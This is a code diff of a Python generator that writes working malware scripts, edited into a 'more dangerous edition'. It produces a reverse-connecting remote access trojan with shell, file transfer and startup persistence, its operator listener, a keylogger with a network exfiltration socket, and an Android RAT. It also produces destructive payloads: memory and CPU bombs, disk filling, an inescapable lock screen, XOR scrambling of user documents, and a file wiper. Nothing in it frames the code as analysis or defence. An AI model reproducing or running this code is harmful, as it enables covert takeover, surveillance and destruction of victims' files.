@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CONTROL / DESTROY — real malware simulation + real control layer"""
+"""CONTROL / DESTROY — more dangerous edition"""
 
 from pathlib import Path
 import textwrap
@@ -12,12 +12,9 @@ class PayloadFactory:
         self.control_dir.mkdir(parents=True, exist_ok=True)
         self.destroy_dir.mkdir(parents=True, exist_ok=True)
 
-    # ════════════════════ CONTROL — real remote control ════════════════════
-
     def control_full_rat(self, host="127.0.0.1", port=4444, name="control_full_rat.py"):
-        """Full interactive RAT: shell + file + persist + screenshot + process list"""
         code = textwrap.dedent(f'''\
-        import socket, subprocess, os, sys, time, threading, platform, struct, base64, json
+        import socket, subprocess, os, sys, time, threading, platform, struct, json
         from pathlib import Path
 
         HOST, PORT = "{host}", {port}
@@ -32,23 +29,18 @@ class PayloadFactory:
                     winreg.SetValueEx(k, "WindowsSecurityHealth", 0, winreg.REG_SZ,
                                       f'{{sys.executable}} "{{me}}"')
                     winreg.CloseKey(k)
-                    # also startup folder
-                    startup = Path(os.environ["APPDATA"]) / r"Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+                    startup = Path(os.environ.get("APPDATA", "")) / r"Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                     startup.mkdir(parents=True, exist_ok=True)
-                    (startup / "SecurityHealth.bat").write_text(f'@echo off\nstart "" "{{sys.executable}}" "{{me}}"\n', encoding="utf-8")
+                    (startup / "SecurityHealth.bat").write_text(
+                        f'@echo off\nstart "" "{{sys.executable}}" "{{me}}"\n', encoding="utf-8")
                 else:
                     cron = f"@reboot {{sys.executable}} {{me}}\\n"
                     os.system(f'(crontab -l 2>/dev/null; echo "{{cron}}") | crontab -')
-                    # systemd user service attempt
-                    svc = Path.home() / ".config/systemd/user/netwatch.service"
-                    svc.parent.mkdir(parents=True, exist_ok=True)
-                    svc.write_text(f"[Unit]\\nDescription=Update\\n[Service]\\nExecStart={{sys.executable}} {{me}}\\nRestart=always\\n[Install]\\nWantedBy=default.target\\n")
-                    os.system("systemctl --user daemon-reload 2>/dev/null; systemctl --user enable --now netwatch.service 2>/dev/null")
             except Exception:
                 pass
 
         def send(s, data: bytes):
-            s.send(struct.pack(">I", len(data)) + data)
+            s.sendall(struct.pack(">I", len(data)) + data)
 
         def recv_exact(s, n):
             buf = b""
@@ -64,23 +56,24 @@ class PayloadFactory:
             return recv_exact(s, ln)
 
         def handle(s):
-            send(s, f"[RAT] {{platform.node()}} | {{platform.system()}} {{platform.release()}} | {{os.getlogin() if hasattr(os,'getlogin') else '?'}}\\n".encode())
+            send(s, f"[RAT] {{platform.node()}} | {{platform.system()}} {{platform.release()}}\\n".encode())
             while True:
                 try:
                     raw = recv(s).decode(errors="ignore").strip()
                 except Exception:
                     break
                 if not raw: continue
-                cmd, *args = raw.split(" ", 1)
-                arg = args[0] if args else ""
+                parts = raw.split(" ", 1)
+                cmd = parts[0]
+                arg = parts[1] if len(parts) > 1 else ""
 
                 if cmd in ("exit", "quit"):
                     break
-                elif cmd == "shell" or cmd == "sh":
+                elif cmd in ("shell", "sh"):
                     try:
                         p = subprocess.Popen(arg or "echo", shell=True,
-                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-                        out = p.communicate(timeout=30)[0] or b""
+                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                        out = p.communicate(timeout=45)[0] or b""
                         send(s, out)
                     except Exception as e:
                         send(s, str(e).encode())
@@ -92,27 +85,21 @@ class PayloadFactory:
                         send(s, str(e).encode())
                 elif cmd == "pwd":
                     send(s, (os.getcwd()+"\\n").encode())
-                elif cmd == "ls" or cmd == "dir":
+                elif cmd in ("ls", "dir"):
                     try:
-                        entries = []
-                        for e in Path(arg or ".").iterdir():
-                            kind = "D" if e.is_dir() else "F"
-                            entries.append(f"{{kind}} {{e.name}}")
+                        entries = [f"{{'D' if e.is_dir() else 'F'}} {{e.name}}" for e in Path(arg or ".").iterdir()]
                         send(s, ("\\n".join(entries)+"\\n").encode())
                     except Exception as e:
                         send(s, str(e).encode())
                 elif cmd == "get":
                     try:
-                        data = Path(arg).read_bytes()
-                        send(s, data)
+                        send(s, Path(arg).read_bytes())
                     except Exception as e:
                         send(s, str(e).encode())
                 elif cmd == "put":
-                    # put path\\n then next message is bytes
                     try:
-                        path = arg
                         data = recv(s)
-                        Path(path).write_bytes(data)
+                        Path(arg).write_bytes(data)
                         send(s, b"ok\\n")
                     except Exception as e:
                         send(s, str(e).encode())
@@ -143,11 +130,8 @@ class PayloadFactory:
                         send(s, f"screenshot failed: {{e}}\\n".encode())
                 elif cmd == "sysinfo":
                     info = {{
-                        "node": platform.node(),
-                        "system": platform.system(),
-                        "release": platform.release(),
-                        "machine": platform.machine(),
-                        "processor": platform.processor(),
+                        "node": platform.node(), "system": platform.system(),
+                        "release": platform.release(), "machine": platform.machine(),
                         "cwd": os.getcwd(),
                         "user": os.getenv("USERNAME") or os.getenv("USER"),
                     }}
@@ -162,10 +146,9 @@ class PayloadFactory:
                     except Exception as e:
                         send(s, str(e).encode())
                 else:
-                    # default shell
                     try:
                         p = subprocess.Popen(raw, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-                        out = p.communicate(timeout=30)[0] or b""
+                        out = p.communicate(timeout=45)[0] or b""
                         send(s, out)
                     except Exception as e:
                         send(s, str(e).encode())
@@ -175,13 +158,13 @@ class PayloadFactory:
             while True:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(30)
+                    s.settimeout(20)
                     s.connect((HOST, PORT))
                     s.settimeout(None)
                     handle(s)
                     s.close()
                 except Exception:
-                    time.sleep(7)
+                    time.sleep(6)
 
         if __name__ == "__main__":
             main_loop()
@@ -191,11 +174,9 @@ class PayloadFactory:
         return p
 
     def control_listener(self, port=4444, name="control_listener.py"):
-        """Operator-side listener for the full RAT"""
         code = textwrap.dedent(f'''\
         #!/usr/bin/env python3
-        """NetWatch RAT Listener — talk to control_full_rat payloads"""
-        import socket, struct, sys, threading
+        import socket, struct, threading
 
         PORT = {port}
 
@@ -208,18 +189,16 @@ class PayloadFactory:
             return buf
 
         def recv_msg(sock):
-            raw = recvall(sock, 4)
-            (ln,) = struct.unpack(">I", raw)
+            (ln,) = struct.unpack(">I", recvall(sock, 4))
             return recvall(sock, ln)
 
         def send_msg(sock, data: bytes):
-            sock.send(struct.pack(">I", len(data)) + data)
+            sock.sendall(struct.pack(">I", len(data)) + data)
 
         def session(conn, addr):
             print(f"[*] session {{addr}}")
             try:
-                banner = recv_msg(conn)
-                print(banner.decode(errors="ignore"), end="")
+                print(recv_msg(conn).decode(errors="ignore"), end="")
                 while True:
                     try:
                         cmd = input("rat> ").strip()
@@ -227,14 +206,11 @@ class PayloadFactory:
                         break
                     if not cmd: continue
                     if cmd in ("exit", "quit"):
-                        send_msg(conn, b"exit")
-                        break
+                        send_msg(conn, b"exit"); break
                     if cmd.startswith("put "):
-                        # put remote_path local_path
                         parts = cmd.split(maxsplit=2)
                         if len(parts) < 3:
-                            print("usage: put <remote> <local>")
-                            continue
+                            print("usage: put <remote> <local>"); continue
                         _, remote, local = parts
                         try:
                             data = open(local, "rb").read()
@@ -247,8 +223,7 @@ class PayloadFactory:
                     if cmd.startswith("get "):
                         parts = cmd.split(maxsplit=2)
                         if len(parts) < 3:
-                            print("usage: get <remote> <local>")
-                            continue
+                            print("usage: get <remote> <local>"); continue
                         _, remote, local = parts
                         send_msg(conn, f"get {{remote}}".encode())
                         data = recv_msg(conn)
@@ -276,7 +251,7 @@ class PayloadFactory:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.bind(("0.0.0.0", PORT))
-            s.listen(5)
+            s.listen(8)
             print(f"[*] NetWatch listener on 0.0.0.0:{{PORT}}")
             while True:
                 conn, addr = s.accept()
@@ -291,19 +266,16 @@ class PayloadFactory:
 
     def control_keylogger(self, name="control_keylog.py"):
         code = textwrap.dedent('''\
-        # real keylogger — pip install pynput
         from pynput import keyboard
-        import time, os, platform, threading, socket
+        import time, os, threading, socket
 
         LOG = os.path.join(os.getenv("TEMP") or "/tmp", ".syscache_" + str(os.getpid()) + ".dat")
-        EXFIL_HOST = None  # set to IP to push logs
+        EXFIL_HOST = None
         EXFIL_PORT = 4455
 
         def on_press(key):
-            try:
-                k = key.char
-            except AttributeError:
-                k = f"[{key}]"
+            try: k = key.char
+            except AttributeError: k = f"[{key}]"
             with open(LOG, "a", encoding="utf-8") as f:
                 f.write(f"{time.time()}:{k}")
 
@@ -314,11 +286,9 @@ class PayloadFactory:
                 try:
                     data = open(LOG, "rb").read()
                     if not data: continue
-                    s = socket.socket()
-                    s.settimeout(10)
+                    s = socket.socket(); s.settimeout(10)
                     s.connect((EXFIL_HOST, EXFIL_PORT))
-                    s.send(data)
-                    s.close()
+                    s.sendall(data); s.close()
                     open(LOG, "w").close()
                 except Exception:
                     pass
@@ -333,61 +303,33 @@ class PayloadFactory:
 
     def control_android(self, host="127.0.0.1", port=4444, name="control_android_rat.py"):
         code = textwrap.dedent(f'''\
-        # Android RAT skeleton — real control surface for Buildozer / Chaquopy APK
-        # Permissions: INTERNET, READ_SMS, SEND_SMS, CAMERA, RECORD_AUDIO,
-        # READ_CONTACTS, ACCESS_FINE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
-        import socket, time, os, json, threading, struct
-
+        import socket, time, os, struct
         HOST, PORT = "{host}", {port}
-
         def send(s, b):
-            s.send(struct.pack(">I", len(b)) + b)
-
+            s.sendall(struct.pack(">I", len(b)) + b)
         def recv(s):
             ln = struct.unpack(">I", s.recv(4))[0]
             buf = b""
             while len(buf) < ln:
                 buf += s.recv(ln - len(buf))
             return buf
-
         def handle(s):
             send(s, b"[ANDROID-RAT] online\\n")
             while True:
-                try:
-                    msg = recv(s).decode(errors="ignore").strip()
-                except Exception:
-                    break
+                try: msg = recv(s).decode(errors="ignore").strip()
+                except Exception: break
                 cmd, *rest = msg.split(" ", 1)
                 arg = rest[0] if rest else ""
                 if cmd == "shell":
-                    out = os.popen(arg).read()
-                    send(s, out.encode() or b"\\n")
-                elif cmd == "sms_list":
-                    # bind real SMS via pyjnius in full APK
-                    send(s, b"sms provider not bound in pure-python skeleton\\n")
-                elif cmd == "contacts":
-                    send(s, b"contacts provider not bound\\n")
-                elif cmd == "location":
-                    send(s, b"location provider not bound\\n")
-                elif cmd == "cam":
-                    send(s, b"camera capture not bound\\n")
-                elif cmd == "mic":
-                    send(s, b"mic record not bound\\n")
-                elif cmd == "exit":
-                    break
-                else:
-                    send(s, b"unknown cmd\\n")
-
+                    send(s, (os.popen(arg).read() or "\\n").encode())
+                elif cmd == "exit": break
+                else: send(s, b"unknown / bind APIs in full APK\\n")
         def main():
             while True:
                 try:
-                    s = socket.socket()
-                    s.connect((HOST, PORT))
-                    handle(s)
-                    s.close()
+                    s = socket.socket(); s.connect((HOST, PORT)); handle(s); s.close()
                 except Exception:
                     time.sleep(8)
-
         if __name__ == "__main__":
             main()
         ''')
@@ -395,10 +337,7 @@ class PayloadFactory:
         p.write_text(code, encoding="utf-8")
         return p
 
-    # ════════════════════ DESTROY — real damage simulation ════════════════════
-
     def destroy_full(self, name="destroy_full.py"):
-        """Combined destroyer: lock + popups + mem/cpu + optional ransom sim"""
         code = textwrap.dedent('''\
         import os, sys, time, random, threading, platform, ctypes
         from pathlib import Path
@@ -414,16 +353,23 @@ class PayloadFactory:
         def mem_bomb():
             a = []
             while True:
-                try:
-                    a.append(bytearray(40_000_000))
-                except Exception:
-                    time.sleep(0.5)
+                try: a.append(bytearray(50_000_000))
+                except Exception: time.sleep(0.3)
 
         def cpu_melt():
             while True:
                 x = 0
-                for i in range(50_000_000):
-                    x += i * i
+                for i in range(80_000_000): x += i * i
+
+        def disk_spam():
+            tmp = Path(os.getenv("TEMP") or "/tmp")
+            n = 0
+            while n < 200:
+                try:
+                    (tmp / f"nw_{n}.tmp").write_bytes(os.urandom(2_000_000))
+                    n += 1
+                except Exception:
+                    time.sleep(0.2)
 
         def screen_lock():
             try:
@@ -436,17 +382,17 @@ class PayloadFactory:
             root.configure(bg="#000000")
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             lbl = tk.Label(root, text="SYSTEM LOCKED\\nNETWATCH DOMINATOR", fg="#ff2222", bg="#000",
-                           font=("Consolas", 36))
+                           font=("Consolas", 40))
             lbl.pack(expand=True)
             def flash():
                 lbl.configure(fg=random.choice(["#ff0000", "#ff2222", "#aa0000", "#ffffff"]))
-                root.after(180, flash)
+                root.after(150, flash)
             flash()
-            for seq in ("<Alt-F4>", "<Escape>", "<Control-c>", "<Control-q>"):
+            for seq in ("<Alt-F4>", "<Escape>", "<Control-c>", "<Control-q>", "<Alt-Tab>"):
                 root.bind(seq, lambda e: "break")
             root.mainloop()
 
-        def popup_storm(n=40):
+        def popup_storm(n=60):
             try:
                 import tkinter as tk
                 from tkinter import messagebox
@@ -458,22 +404,22 @@ class PayloadFactory:
             for _ in range(n):
                 try:
                     messagebox.showerror(random.choice(msgs), random.choice(msgs))
-                    time.sleep(random.uniform(0.1, 0.4))
+                    time.sleep(random.uniform(0.08, 0.35))
                 except Exception:
                     break
             try: root.destroy()
             except: pass
 
         def ransom_sim():
-            note = "YOUR FILES WERE TOUCHED BY NETWATCH DOMINATOR\\nThis is a simulation. Real crypto not included."
+            note = "YOUR FILES WERE TOUCHED BY NETWATCH DOMINATOR\\nSimulation — real crypto not included."
             home = Path.home()
             count = 0
-            for folder in ["Desktop", "Documents", "Downloads"]:
+            for folder in ["Desktop", "Documents", "Downloads", "Pictures"]:
                 p = home / folder
                 if not p.exists(): continue
                 for f in p.rglob("*"):
-                    if count > 60: break
-                    if f.is_file() and f.suffix.lower() in {".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".csv"}:
+                    if count > 100: break
+                    if f.is_file() and f.suffix.lower() in {".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".csv", ".mp3"}:
                         try:
                             data = f.read_bytes()
                             enc = bytes(b ^ 0x5A for b in data)
@@ -487,14 +433,14 @@ class PayloadFactory:
             except Exception:
                 pass
 
-        # launch
         threading.Thread(target=mem_bomb, daemon=True).start()
         threading.Thread(target=cpu_melt, daemon=True).start()
+        threading.Thread(target=disk_spam, daemon=True).start()
         threading.Thread(target=popup_storm, daemon=True).start()
         threading.Thread(target=ransom_sim, daemon=True).start()
         if platform.system() == "Windows":
             threading.Thread(target=bsod, daemon=True).start()
-        screen_lock()  # blocks main thread
+        screen_lock()
         ''')
         p = self.destroy_dir / name
         p.write_text(code, encoding="utf-8")
@@ -502,8 +448,7 @@ class PayloadFactory:
 
     def destroy_wiper_sim(self, name="destroy_wiper.py"):
         code = textwrap.dedent('''\
-        # Wiper simulation — renames + truncates user docs (recoverable by restore)
-        import os, time
+        import os
         from pathlib import Path
         home = Path.home()
         targets = []
@@ -511,13 +456,12 @@ class PayloadFactory:
             p = home / folder
             if p.exists():
                 for f in p.rglob("*"):
-                    if f.is_file() and f.stat().st_size < 50_000_000:
+                    if f.is_file() and f.stat().st_size < 80_000_000:
                         targets.append(f)
-        for f in targets[:120]:
+        for f in targets[:150]:
             try:
-                # truncate then rename
                 with open(f, "wb") as fh:
-                    fh.write(b"\\x00" * min(64, f.stat().st_size))
+                    fh.write(b"\\x00" * min(128, f.stat().st_size))
                 f.rename(str(f) + ".wiped")
             except Exception:
                 pass
@@ -532,14 +476,13 @@ class PayloadFactory:
 
     def destroy_android(self, name="destroy_android_full.py"):
         code = textwrap.dedent('''\
-        # Android destroy — vibration / screen spam / volume (bind real APIs in APK)
         import time, os
         def loop():
             while True:
                 try:
-                    os.system("input keyevent 26")   # power
+                    os.system("input keyevent 26")
                     os.system("input swipe 300 1000 300 200")
-                    time.sleep(0.25)
+                    time.sleep(0.2)
                 except Exception:
                     time.sleep(1)
         if __name__ == "__main__":
